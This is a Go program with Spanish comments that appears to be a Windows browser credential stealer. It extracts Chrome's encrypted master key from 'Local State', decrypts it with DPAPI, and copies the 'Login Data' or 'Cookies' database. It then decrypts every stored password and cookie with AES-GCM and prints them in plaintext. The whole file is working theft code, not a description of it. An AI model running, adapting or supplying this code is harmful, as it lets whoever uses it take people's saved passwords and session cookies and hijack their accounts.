package main

import(
	"io"
	"errors"
	"fmt"
	"database/sql"
	"unsafe"
	"os"
	"io/ioutil"
	"log"
	"encoding/json"
	"encoding/base64"
	"golang.org/x/sys/windows"
	_ "github.com/mattn/go-sqlite3"
	"crypto/aes"
	"crypto/cipher"
)

var chrome_path = "\\Google\\Chrome\\User Data\\"

//(1) estructura para almacenar los datos de las cookies
type Cookies struct{
	host_key			string
	expires_utc			uint64
	name				string
	elected				bool
}

func (* Cookies) GetQueryString() string{
	return "SELECT host_key,encrypted_value,expires_utc,name FROM cookies"
}

//(2) estructura para almacenar los datos de las credenciales
type LoginData struct{
	origin_url		string
	username_value	string
	date_last_used	uint32
	elected			bool
}

func (* LoginData) GetQueryString() string{
	return "SELECT origin_url,username_value,password_value,date_last_used FROM logins"
}

func error_handler(except error){
	if except != nil{
		log.Fatal(except)
	}
}

func DPAPI_decrypt(edata []byte) []byte{
	//Se crea las estructuras de datos para almacenar la llave
  	//en texto plano:
	var data = []byte{}
	var data_out = windows.DataBlob{}
	//se crea un datablob con la llave cifrada:
	var data_in = windows.DataBlob{Size:uint32(len(edata)), Data:&edata[0]}
	//funcion de de DPAPI para descifrado de datos
	err := windows.CryptUnprotectData(&data_in,
									  nil,
									  nil,
									  0,
									  nil,
									  0,
									  &data_out,
	)
	error_handler(err)
	//se almacena la llave descifrada y se retorna al llamado de la funcion
	for i:=uint32(0); i<data_out.Size; i++{
		ptrbyte := uintptr(unsafe.Pointer(data_out.Data))+uintptr(i)
		data = append(data, *(*byte)(unsafe.Pointer(ptrbyte)))
	}

	return data
}

//Funcion para extraer la llave de cifrado
//usada por chome
func get_chrome_key() []byte{
	var dlocals interface{}

	//se accede al archivo de configuracion y se transforma en 
	//en interface de golang
	jfile, err := os.Open(fmt.Sprintf("%s%s", chrome_path, "Local State"))
	error_handler(err)

	jdata, err := ioutil.ReadAll(jfile)
	error_handler(err)

	err = json.Unmarshal(jdata, &dlocals)
	error_handler(err)

	//se extrae la llave accediendo a los mapas de JSON y se transforma en 
	//string
	dkey := dlocals.(map[string]interface{})["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	ekey, err := base64.StdEncoding.DecodeString(dkey) //(5) se decodifica la llave en bytes
	error_handler(err)

	//los 5 primeros bytes es una especie de encabezado que no hace parte de
	//la llave
	return DPAPI_decrypt(ekey[5:])
}

//Funcion para descifrar los datos, recibe como parametro el nombre
//de la base de datos y la llave de cifrado
func decrypt_database(aes_key []byte, dbtype string){
   //inicializacion de variables para recibir el texto cifrado
   //el texto descifrado, creacion de estructuras de cookies y logins
	var plain_text []byte
	var ciphered []byte
	var query string
	var printstr string
	var cookie Cookies
	var login LoginData
	var fields []interface{}

	//Se crea el bloque de cifrado AES con la llave de cifrado
    //luego se adiciona al metodo GCM para obtener el cipher
	aes_block, err := aes.NewCipher(aes_key)
	error_handler(err)

	aesgcm, err := cipher.NewGCM(aes_block)
	error_handler(err)

	//conexion con la BD
	dbconn, err := sql.Open("sqlite3", "temp.db")
	error_handler(err)
	defer dbconn.Close()

	//Seleccion de la base de datos, si es cookies se definen unos
    //campos de consulta a la BD, si es login otros.
	switch dbtype{
		case "Cookies":
			query = cookie.GetQueryString()
			fields = []interface{}{&cookie.host_key,
								   &ciphered, 
								   &cookie.expires_utc, 
								   &cookie.name,
			}
			cookie.elected = true
			printstr = "Host: %s, Cookie: %s=%s, Expire_at: %d"

		case "Login Data":
			query = login.GetQueryString()
			fields = []interface{}{&login.origin_url, 
								   &login.username_value, 
								   &ciphered, 
								   &login.date_last_used,
			}
			login.elected = true
			printstr = "URL: %s, Username: %s, Password: %s, Last_used: %d"

		default:
			os.Exit(1)
	}
	//Se lanza la consulta y se recorre cada entrada en un ciclo
	dbrows, err := dbconn.Query(query)
	error_handler(err)
	
	for dbrows.Next(){
		dbrows.Scan(fields...)

		//se descifran los datos de acuerdo al nonce [3:15] y los datos
      	//cifrados[15:]
		plain_text, err = aesgcm.Open(nil, ciphered[3:15], ciphered[15:], nil)
		error_handler(err)
		
		//Se imprime la informacion descifrada
		if login.elected{
			fmt.Println(fmt.Sprintf(printstr, login.origin_url, login.username_value, plain_text, login.date_last_used))
		}else if cookie.elected{
			fmt.Println(fmt.Sprintf(printstr, cookie.host_key, cookie.name, plain_text, cookie.expires_utc))
		}
	}
}

//Funcion para copiar la BD especificada
//por stdin
func copy_database(dbname string){
	var dbpath = fmt.Sprintf("%s%s%s", chrome_path, "Default\\", dbname)

	srcdb, err := os.Open(dbpath)
	error_handler(err)

	dstdb, err := os.Create("temp.db")
	error_handler(err)

	_, err = io.Copy(dstdb, srcdb)
	error_handler(err)
}

func main(){
	//Se extrae el directorio del appdata
	if appdata, exist := os.LookupEnv("LOCALAPPDATA"); exist{
		chrome_path = fmt.Sprintf("%s%s", appdata, chrome_path)
	}else{
		err := errors.New("APPDATA not in PATH")
		error_handler(err)
	}

	//Especificar el nombre de la BD a descifrar en la stdin
	if len(os.Args) != 2{
		fmt.Println("USAGE: %s [DB_FILE_NAME]", os.Args[0])
		os.Exit(2)
	}
	
	dbname := os.Args[1]

	key := get_chrome_key()
	copy_database(dbname)
	decrypt_database(key, dbname)

}
